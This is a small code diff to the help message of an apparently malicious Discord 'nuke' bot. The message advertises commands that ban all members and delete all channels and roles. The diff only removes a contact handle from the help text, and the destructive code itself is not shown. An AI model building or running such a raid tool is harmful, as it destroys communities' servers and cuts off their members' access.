@@ -36,7 +36,7 @@ if(msg.content.toLowerCase().startsWith("!" + "help")){
         embed: {
             color: 0xff0000,
             author: { name: "Nope" },
-            description: "!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Jinx#4395"
+            description: "!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\n"
         }
     })
 }
